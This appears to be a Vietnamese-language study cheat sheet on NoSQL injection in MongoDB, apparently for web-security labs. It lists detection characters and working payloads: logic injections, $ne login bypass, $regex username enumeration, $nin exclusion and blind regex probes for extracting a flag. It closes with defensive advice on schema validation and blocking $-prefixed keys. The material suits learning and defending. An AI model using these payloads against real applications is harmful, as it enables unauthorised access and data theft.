# NoSQL Injection

Source: https://www.notion.so/31e4d37069a8803ea388db2e4d758444

## Tổng Quan

NoSQL Injection xảy ra khi input của user được đưa vào truy vấn NoSQL mà không validate hoặc encode đúng cách. Với MongoDB, attacker thường lạm dụng operator như `$ne`, `$regex`, `$nin` hoặc chèn biểu thức logic.

## Detect

Các ký tự/payload dễ gây khác biệt:

```text
'
"
\
{
}
$
;
```

Các payload logic:

```text
' && 1 == 1
' && '1' == '1
' || 1 == 1
' || '1' == '1
' || 1 ||
```

## Operator Injection

Bypass authentication bằng `$ne`:

```json
{
  "username": "wiener",
  "password": { "$ne": "wrong-password" }
}
```

Tìm username bằng regex:

```json
{
  "username": { "$regex": "^a.*" },
  "password": { "$ne": "x" }
}
```

Loại trừ username đã biết:

```text
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=admin
```

## Blind NoSQLi

Với blind NoSQLi có thể dò độ dài và từng ký tự bằng `$regex`:

```text
flag[$regex]=.{21}
flag[$regex]=^.{0}a
```

## Phòng Chống

- Validate input theo schema rõ ràng.
- Không truyền raw object từ request body vào query.
- Chặn key bắt đầu bằng `$`.
- Dùng allowlist field.
- Ép kiểu string/number trước khi query.

